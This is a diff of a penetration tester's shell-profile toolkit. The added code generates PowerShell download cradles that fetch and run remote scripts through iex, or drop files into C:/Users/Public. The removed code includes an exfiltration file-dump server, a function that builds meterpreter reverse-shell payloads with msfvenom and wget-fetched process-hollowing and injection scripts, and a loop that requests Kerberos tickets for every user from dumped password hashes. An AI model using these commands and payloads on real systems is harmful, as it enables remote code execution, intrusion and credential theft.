@@ -237,74 +237,85 @@ function nginxhere() {
 }
 
 
-echo -e "iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT> <DIR_PATH>"
-function iexurls(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
+echo -e "iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <INTERFACE> <PORT> [<DIR_PATH>]"
+iexurls () {
+  RED='\033[0;31m'
+  NC='\033[0m'
 
-        if [ $# -eq 3 ];then
-                IP=$1
-                PORT=$2
-                DIR_PATH=$3
-                find $DIR_PATH -name "*.ps1" | while read SCRIPT_PATH 
-                        do
+  # Default values
+  DEFAULT_PORT="8080"
+  DEFAULT_DIR="."
 
-                                DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$SCRIPT_PATH'))"
-                                # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                echo $DOWNLOAD_CRADLE | sed "s*/$DIR_PATH**g"
-                                # echo "$DOWNLOAD_CRADLE_OBFS"
-                                echo "\n"
-                        done
-        else
-                echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT> <DIR_PATH>${NC}"
-        fi
+  if [ $# -eq 2 ]; then
+    INTERFACE=$1
+    PORT=$2
+    DIR_PATH=$DEFAULT_DIR
+  elif [ $# -eq 3 ]; then
+    INTERFACE=$1
+    PORT=$2
+    DIR_PATH=$3
+  else
+    echo -e "${RED}iexurls - usage: iexurls <INTERFACE> <PORT> [<DIR_PATH>]${NC}"
+    return 1
+  fi
+
+  # Extract the IP address of the given interface
+  IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
+
+  if [ -z "$IP" ]; then
+    echo -e "${RED}No IP found for interface $INTERFACE. Please check the interface name.${NC}"
+    return 1
+  fi
+
+  echo "Using IP: $IP (from interface $INTERFACE)"
+
+  # Find and process .ps1 files
+  find $DIR_PATH -name "*.ps1" | while read SCRIPT_PATH; do
+    RELATIVE_PATH=$(realpath --relative-to="$DIR_PATH" "$SCRIPT_PATH")
+    DOWNLOAD_CRADLE="iex((New-Object net.webclient).DownloadString('http://$IP:$PORT/$RELATIVE_PATH'))" 
+    echo $DOWNLOAD_CRADLE
+    echo
+  done
 }
+
 
 echo -e "psdownloadcradles - recursively looks for extension file and generates PowerShell download cradles for these - psdownloadcradles <IP> <PORT> <EXTENSION> <DIR_PATH>"
 function psdownloadcradles(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
+    RED='\033[0;31m'
+    NC='\033[0m' # No Color
 
-        if [ $# -eq 4 ];then
-                IP=$1
-                PORT=$2
-                EXTESION=$3
-                DIR_PATH=$4
+    if [ $# -eq 4 ]; then
+        INTERFACE=$1
+        PORT=$2
+        EXTENSION=$3
+        DIR_PATH=$4
 
-                find $DIR_PATH -name "*.$EXTESION" | while read SCRIPT_PATH 
-                        do
-                                FILENAME=$(echo "$SCRIPT_PATH" | rev | cut -d"/" -f1 | rev) 
-                                DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$SCRIPT_PATH','C:/Users/Public/$FILENAME')"
-                                # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                echo $DOWNLOAD_CRADLE | sed "s*/$DIR_PATH**g"
-                                # echo "$DOWNLOAD_CRADLE_OBFS"
-                                echo "\n"
-                        done
-        else
-                echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
+        # Extract the IP address from the interface
+        IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
+
+        if [ -z "$IP" ]; then
+            echo -e "${RED}No IP found for interface $INTERFACE. Please check the interface name.${NC}"
+            return 1
         fi
-}
 
-function offshorepsdownloadcradles(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
+        echo "Using IP: $IP (from interface $INTERFACE)"
 
-        if [ $# -eq 3 ];then
-                IP=$1
-                PORT=$2
-                EXTESION=$3
-                find "/home/$USER/Offshore" -name "*.$EXTESION" | while read SCRIPT_PATH 
-                        do
-                                SCRIPT_PATH=`echo "$SCRIPT_PATH" | cut -d "/" -f 5-`
-                                DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$SCRIPT_PATH','C:/Users/Public/$FILENAME')"
-                                # DOWNLOAD_CRADLE_OBFS=$(psobfuscatecmd "$DOWNLOAD_CRADLE")
-                                echo "$DOWNLOAD_CRADLE" | sed "s/\/\/home\/$USER\/OSEP//g"
-                                # echo "$DOWNLOAD_CRADLE_OBFS"
-                                echo "\n"
-                        done
-        else
-                echo -e "${RED}iexurls - recurively looks for ps1 files and generates PowerShell download cradles for these - iexurl <IP> <PORT>${NC}"
-        fi
+        # Find files and generate download cradles
+        find $DIR_PATH -name "*.$EXTENSION" | while read SCRIPT_PATH; do
+            # Extract the filename
+            FILENAME=$(basename "$SCRIPT_PATH")
+            # Get the relative path of the script
+            RELATIVE_PATH=$(realpath --relative-to="$DIR_PATH" "$SCRIPT_PATH")
+            # Build the download cradle
+            DOWNLOAD_CRADLE="(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$RELATIVE_PATH','C:/Users/Public/$FILENAME')"
+            # Output the download cradle
+            echo $DOWNLOAD_CRADLE
+            echo
+        done
+    else
+        echo -e "${RED}psdownloadcradles - recursively looks for files with the specified extension and generates PowerShell download cradles.${NC}"
+        echo -e "${RED}Usage: psdownloadcradles <INTERFACE> <PORT> <EXTENSION> <DIR_PATH>${NC}"
+    fi
 }
 
 alias iexurlsgrep="iexurls | grep --color=never"
@@ -321,12 +332,6 @@ smbservehere() {
 
 echo "webdavhere - spawns webdav server in current dir"
 alias webdavhere='sudo docker run --rm -it -p 80:80 -v "${PWD}:/srv/data/share" rflathers/webdav'
-
-echo "reqdump - spawns a simple HTTP Request Dumper. It's s simple JavaScript server that echos any HTTP request it receives it to stdout."
-alias reqdump='sudo docker run --rm -it -p 80:3000 rflathers/reqdump'
-
-echo "postfiledumphere - spawns a web server for exifiltration - exifiltration on target via curl --data-binary"
-alias postfiledumphere='sudo docker run --rm -it -p80:3000 -v "${PWD}:/data" rflathers/postfiledump'
 
 ## ssh-start
 echo "ssh-start - start OS SSH service"
@@ -345,21 +350,6 @@ alias smb-stop="sudo systemctl stop smbd nmbd"
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - INFRA PENTEST - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
-
-echo "nmapfastscan - runs NMAP scanner; fast top1000 TCP; specify <IP's>"
-alias nmapfastscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -Pn -n --top-ports 1000 -vvvv --a "x64" -open --max-retries 3 --max-rtt-timeout 900ms --min-hostgroup 254 --min-rate 30000 --defeat-rst-ratelimit --host-timeout 1m "
-
-echo "nmapfulltcpscan - runs NMAP scanner; all TCP ports; specify <IP's>"
-alias nmapfulltcpscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -Pn -p- -vvvv --a "x64" -open --min-rate 20000 --defeat-rst-ratelimit --host-timeout 5m -a "x64" -oA /tmp/nmap_fulltcp --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl "
-
-echo "nmapservicescan - runs NMAP scanner; specific TCP ports; specify <IP's> and -p <PORTS>"
-alias nmapservicescan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -sV -vvvv --a "x64" -open -sC --script-timeout 15m -a "x64" -o -Pn -a "x64" -oA /tmp/nmap_servicescan "
-
-echo "testssl-docker - testssl docker version - testssl-docker"
-alias testssl-docker='sudo docker run --rm -ti -v "${PWD}:/data" drwetter/testssl.sh -s -f -p -S -P -h -U --ip one --htmlfile /data/ --logfile /data/ --jsonfile-pretty /data/ --csvfile /data/ --warnings=batch'
-
-echo "cme - CrackMapExec docker edition - cme <args>"
-alias cme='sudo docker run --rm -it --entrypoint=/usr/local/bin/cme --name crackmapexec-run -v "${PWD}/CrackMapExec-data:/root/.cme" byt3bl33d3r/crackmapexec'
 
 echo "getports - returns ports of a nmap scan - getports <nmapfile.nmap>"
 function getports() {
@@ -395,10 +385,6 @@ function startnessus() {
         fi
 }
 
-echo "eyewitness - Eyewitness docker edition - eyewitness <args>"
-alias eyewitness='sudo docker run --rm -it -v /path/to/results:/tmp/EyeWitness eyewitness'
-
-
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - OSINT - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
@@ -419,9 +405,6 @@ alias xingdumper="python3 /opt/tools/osint/XingDumper/xingdumper.py"
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - WEB - ]${NC}"
 echo -e "${YELLOW}${BOLD}========================${NC}"
-
-echo "fuxploider - fuxploider to check for upload vulnerabilties: "
-alias fuxploider='sudo docker run --rm -v "${PWD}:/home/fuxploider" -it --name fuxploider fuxploider'
 
 echo "shcheck - Security Header Check; shcheck <url> + <args>"
 alias shcheck='sudo docker run --rm -it --name shcheck miguel1337/shcheck:latest'
@@ -509,84 +492,6 @@ function msfgenpayloads(){
         fi   
 }
 
-echo -e "${YELLOW}${BOLD}\n========================${NC}"
-echo -e "${YELLOW}${BOLD}[ - OSEP - ]${NC}"
-echo -e "${YELLOW}${BOLD}========================${NC}"
-echo "oseppayloads - Generate different oseppayloads - oseppayloads <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX> <PAYLOAD PATH>"
-function oseppayloads(){
-        CURR_PWD=`pwd`
-
-        if [ $# -eq 6 ];then
-                INTERFACE=$1
-                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
-                HTTPS_PORT=$2
-                TCP_PORT=$3
-                HTTPS_PORT_LINUX=$4
-                TCP_PORT_LINUX=$5
-                PAYLOAD_PATH=$6
-
-                cd "$PAYLOAD_PATH"
-                rm meterpreter*                
-
-                echo "Generating meterpreter payloads..."
-                echo "\n${YELLOW}${BOLD}${NC}"
-                echo "\n${YELLOW}${BOLD}==============${NC}"
-                echo "\n${YELLOW}${BOLD}WINDOWS PAYLOADS${NC}"
-                echo "\n${YELLOW}${BOLD}==============${NC}"
-                echo "\n${YELLOW}${BOLD}${NC}"
-
-                echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.raw"
-                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.raw"
-                echo ""
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.raw"
-                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.raw"
-
-                echo "\n${YELLOW}${BOLD}Generating meterpreter C#${NC}"
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.csharp"
-                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_windows_x64_reverse_https_plain_$IPV4-$HTTPS_PORT.csharp"
-                echo ""
-                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.csharp"
-                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_windows_x64_reverse_tcp_plain_$IPV4-$TCP_PORT.csharp"
-
-                echo "\n${YELLOW}${BOLD}Generating AES-256 meterpreter_x64_reverse_https Powershell${NC}"
-                wget https://github.com/michiiii/OSEP-Tools/raw/main/powerhollow.py
-                echo "Command: python powerhollow.py $IPV4 $TCP_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_windows_x64_reverse_tcp_hollow_aes256_$IPV4-$TCP_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
-                python powerhollow.py "$IPV4" "$TCP_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_windows_x64_reverse_tcp_hollow_aes256_$IPV4-$TCP_PORT.ps1" -p "windows/x64/meterpreter/reverse_tcp"
-                echo "Command: python powerhollow.py $IPV4 $HTTPS_PORT 'c:\windows\system32\svchost.exe' 'explorer' 'ps' -out 'meterpreter_windows_x64_reverse_https_hollow_aes256_$IPV4-$HTTPS_PORT.ps1' -p 'windows/x64/meterpreter/reverse_tcp'"
-                python powerhollow.py "$IPV4" "$HTTPS_PORT" "c:\windows\system32\svchost.exe" "explorer" "ps" -out "meterpreter_windows_x64_reverse_https_hollow_aes256_$IPV4-$HTTPS_PORT.ps1" -p "windows/x64/meterpreter/reverse_https"
-                wget https://github.com/michiiii/OSEP-Tools/raw/main/powerinject.py
-                echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_https $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_windows_x64_reverse_https_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
-                python powerinject.py -p "windows/x64/meterpreter/reverse_https" "$IPV4" "$HTTPS_PORT" "svchost" "M" "ps" -out "meterpreter_windows_x64_reverse_https_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
-                echo "Command: python powerinject.py -p windows/x64/meterpreter/reverse_tcp $IPV4 $HTTPS_PORT svchost M ps -out meterpreter_windows_x64_reverse_tcp_inject_aes256_$IPV4-$HTTPS_PORT.ps1"
-                python powerinject.py -p "windows/x64/meterpreter/reverse_tcp" "$IPV4" "$TCP_PORT" "svchost" "M" "ps" -out "meterpreter_windows_x64_reverse_tcp_inject_aes256_$IPV4-$TCP_PORT.ps1"
-
-                echo "\n${YELLOW}${BOLD}==============${NC}"
-                echo "\n${YELLOW}${BOLD}LINUX PAYLOADS${NC}"
-                echo "\n${YELLOW}${BOLD}==============${NC}"
-                echo "\n${YELLOW}${BOLD}${NC}"
-                echo "\n${YELLOW}${BOLD}Generating C meterpreter_XOR_linux_x64_reverse_tcp payload${NC}"
-                # linux/x64/meterpreter/reverse_tcp (c)
-                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f c -o meterpreter_linux_x64_reverse_tcp_XOR_$IPV4_$TCP_PORT_LINUX.c --encrypt xor --encrypt-key f"
-                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`echo -n $IPV4` LPORT=`echo -n $TCP_PORT_LINUX` -f c -o meterpreter_linux_x64_reverse_tcp_XOR_`echo -n $IPV4`_`echo -n $TCP_PORT_LINUX`.c --encrypt xor --encrypt-key f
-
-                echo "\n${YELLOW}${BOLD}Generating ELF meterpreter_XOR_linux_x64_reverse_tcp payload${NC}"
-                # linux/x64/meterpreter/reverse_tcp (ELF)
-                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f elf -o meterpreter_linux_x64_reverse_tcp_XOR_$IPV4_$TCP_PORT_LINUX.elf --encrypt xor --encrypt-key f"
-                msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`echo -n $IPV4` LPORT=`echo -n $TCP_PORT_LINUX` -f elf -o meterpreter_linux_x64_reverse_tcp_XOR_`echo -n $IPV4`_`echo -n $TCP_PORT_LINUX`.elf --encrypt xor --encrypt-key f
-
-                echo "\n${YELLOW}${BOLD}Generating ELF meterpreter_XOR_linux_x64_reverse_https (unstaged) payload${NC}"
-                # Reverse meterpreter HTTPS (unstaged)
-                echo "msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$IPV4 LPORT=$TCP_PORT_LINUX -f elf -o meterpreter_linux_x64_reverse_tcp_XOR_$IPV4_$TCP_PORT_LINUX.elf --encrypt xor --encrypt-key f"
-                msfvenom -p linux/x64/meterpreter_reverse_https LHOST=`echo -n $IPV4` LPORT=`echo -n $HTTPS_PORT_LINUX` -f elf --encrypt xor --encrypt-key f > meterpreter_linux_x64_reverse_https_XOR_`echo -n $IPV4`_`echo -n $HTTPS_PORT_LINUX`.elf
-
-
-        else
-                echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads msfgenpayloads <INTERFACE> <HTTPS_PORT_WIN> <TCP_PORT_WIN> <HTTPS_PORT_LINUX> <TCP_PORT_LINUX> <PAYLOAD PATH>${NC}"
-        fi
-        rm $PAYLOAD_PATH/*.py
-        cd $CURR_PWD
-}
 
 echo -e "${YELLOW}${BOLD}\n========================${NC}"
 echo -e "${YELLOW}${BOLD}[ - Metasploit - ]${NC}"
@@ -663,13 +568,6 @@ function resourcescript(){
 }
 
 
-echo -e "${YELLOW}${BOLD}\n========================${NC}"
-echo -e "${YELLOW}${BOLD}[ - AD - ]${NC}"
-echo -e "${YELLOW}${BOLD}========================${NC}"
-echo "docker-bloodhound.py - Collect data for bloodhound - bloodhound.py <args>"
-alias docker-bloodhound.py='sudo docker run --rm -ti -v "${PWD}:/bloodhound-data" --entrypoint="/usr/local/bin/bloodhound-python" -it "bloodhound.py"'
-
-
 echo "neo4jhere - Start neo4j and save data in current directory - neo4jhere <PROJECT_NAME>"
 function neo4jhere(){
         RED='\033[0;31m'
@@ -690,26 +588,7 @@ function neo4jhere(){
         fi
 }
 
-echo "gimmetgt - Gets a tgt for every user in a secretsdump file - gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>" #this is just a for fun and profit function... not good for opsec :)
-function gimmetgt(){
-        RED='\033[0;31m'
-        NC='\033[0m' # No Color
-        if [ $# -eq 2 ];then
-                DOMAIN_NAME=$1
-                PATH_SECRETSDUMPFILE=$2
-                i=1
-                cat $PATH_SECRETSDUMPFILE |  grep ":::" --color=NEVER | grep "$DOMAIN_NAME" --color=NEVER | cut -d":" -f1,4 | cut -d "\\" -f2 | while read line 
-                do
-                        USER_NAME=$(echo "$line" | cut -d":" -f1)
-                        USER_HASH=$(echo "$line" | cut -d":" -f2)
-                        echo "Tickets are incoming ..."
-                        proxychains impacket-getTGT $DOMAIN_NAME/$USER_NAME -hashes :$USER_HASH
-                done
-                
-        else
-                echo -e "${RED}Please enter a secretsdump output as argument ... gimmetgt <DOMAIN_NAME> <PATH_SECRETSDUMPFILE>${NC}"
-        fi
-}
+
 echo "psencodecmd - encoding a single command - psencodecmd"
 function psencodecmd(){
         RED='\033[0;31m'
